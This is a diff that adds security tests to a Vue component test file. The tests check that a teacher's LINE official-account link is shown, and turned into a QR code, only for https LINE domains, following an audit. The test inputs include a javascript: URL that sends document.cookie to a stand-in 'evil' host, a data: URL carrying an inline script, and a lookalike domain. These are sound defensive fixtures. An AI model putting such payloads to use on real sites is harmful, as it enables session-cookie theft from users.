@@ -126,4 +126,27 @@ describe('PortalProfileView 教師 LINE 官方帳號連結', () => {
       expect.any(Object),
     )
   })
+  it.each([
+    'javascript:fetch("//evil/"+document.cookie)',
+    'data:text/html,<script>alert(1)</script>',
+    'http://line.me/R/ti/p/@school',
+    'https://evil.example/R/ti/p/@school',
+  ])('tenant-meta 連結非 https LINE 網域（%s）時不渲染連結、不產 QR（資安稽核 2026-10-28）', async (url) => {
+    fetchTenantMetaForLine.mockResolvedValue({ tenant: { slug: 'renwu' }, line_bot_friend_url: url })
+
+    const wrapper = await mountView()
+
+    expect(wrapper.find('.line-bind-actions').exists()).toBe(false)
+    expect(wrapper.find('.line-bot-url-missing').exists()).toBe(true)
+    expect(wrapper.html()).not.toContain(url.slice(0, 10))
+    expect(qrToDataURL).not.toHaveBeenCalled()
+  })
+
+  it('lin.ee 短網址照常渲染', async () => {
+    fetchTenantMetaForLine.mockResolvedValue({ tenant: { slug: 'renwu' }, line_bot_friend_url: 'https://lin.ee/AbC123' })
+
+    const wrapper = await mountView()
+
+    expect(wrapper.find('a[href="https://lin.ee/AbC123"]').exists()).toBe(true)
+  })
 })
